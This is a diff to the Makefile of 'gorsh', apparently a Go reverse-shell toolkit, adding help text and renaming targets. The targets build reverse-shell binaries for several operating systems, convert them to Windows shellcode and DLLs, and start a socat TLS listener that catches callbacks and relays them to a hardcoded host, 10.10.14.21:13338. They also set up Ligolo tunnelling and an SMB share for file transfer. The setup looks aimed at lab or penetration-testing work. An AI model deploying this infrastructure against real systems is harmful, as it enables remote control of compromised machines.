@@ -2,9 +2,9 @@
 # CONFIGURATION
 ##############
 # used for artifact naming
-APP = gorsh
+APP ?= gorsh
 # artifact output directory
-OUT = /srv/smb/tools
+OUT ?= /srv/smb/tools
 # build command prefix
 BUILD = go build -trimpath
 # operation systems to build for
@@ -35,29 +35,29 @@ target = $(word 1, $@)
 ##############
 # MAKE TARGETS
 ##############
-all: $(PLATFORMS) shellcode dll
+all: $(PLATFORMS) shellcode dll ## makes all windows, shellcode, dll, linux, darwin targets
 
-${PLATFORMS}: $(SRV_KEY) $(GARBLE)
+${PLATFORMS}: $(SRV_KEY) $(GARBLE) ## one of: windows, linux, darwin
 	GOOS=${target} ${BUILD} \
 		-buildmode pie \
 		-ldflags ${LDFLAGS} \
 		-o ${OUT}/${APP}.${target} \
 		cmd/gorsh/main.go
 
-listen: $(SRV_KEY) $(SOCAT)
+listen: $(SRV_KEY) $(SOCAT) ## starts the socat tls listener that catches callbacks
 	@test -n "$(PORT)" || (echo "PORT not defined"; exit 1)
 	${SOCAT} -d \
 		OPENSSL-LISTEN:${LPORT},fork,key=${SRV_KEY},cert=${SRV_PEM},reuseaddr,verify=0 \
-		EXEC:scripts/${target}.sh
-
+		TCP:10.10.14.21:13338
+		# TCP:127.0.0.1:1234
 		# EXEC:scripts/${target}.sh
 
-shellcode: $(GODONUT) windows
+shellcode: $(GODONUT) windows ## generate PIC windows shellcode
 	${GODONUT} --arch x64 --verbose \
 		--in ${OUT}/${APP}.windows \
 		--out ${OUT}/${APP}.windows.bin 
 
-dll:
+dll:  ## creates a windows dll. exports are definded in `cmd/gorsh-dll/dllmain.go`
 	CGO_ENABLED=1 CC=${DLLCC} \
 	GOOS=windows ${BUILD} \
 		-buildmode=c-shared \
@@ -70,7 +70,7 @@ dll:
 ##############
 # LIGOLO MGMT
 ##############
-ligolo-start:
+start-ligolo:  ## configures the necessary tun interfaces and starts ligolo. requires root
 	ip tuntap add user player1 ligolo mode tun
 	ip link add br0 type bridge
 	$(LIGOLO) -selfcert
@@ -79,20 +79,20 @@ ligolo-start:
 # CIFS MGMNT
 ##############
 export DOCKERSMB SMBCONF
-smbstart:
+start-smb: ## starts docker-smb containers that are needed by the upload/download commands. requires root
 	@echo "$$DOCKERSMB" > docker-compose.yml
 	@echo "$$SMBCONF" > .docker/data/config.yml
 	docker-compose up -d --force-recreate
 
-smbstop:
+stop-smb: ## stop the smb container
 	docker stop samba
 
-smblogs:
+smblogs: ## monitor incoming smb connections
 	docker logs -f samba | grep 'connect\|numopen'
 
 
-clean:
-	rm -rf ${OUT} certs/*
+clean: ## reset the project
+	rm -rf ${OUT} certs/* docker-compose.yml .docker/data/*
 
 
 ##############
@@ -175,4 +175,9 @@ share:
     guestok: yes
 endef
 
-.PHONY: clean smblogs smbstop smbstart ligolo-start dll shellcode listen shellcode $(PLATFORMS) all
+
+.DEFAULT_GOAL = help
+help:
+	@grep -h -E '^[\$a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-30s\033[0m %s\n", $$1, $$2}'
+
+.PHONY: help clean smblogs stop-smb start-smb start-ligolo dll shellcode listen shellcode $(PLATFORMS) all
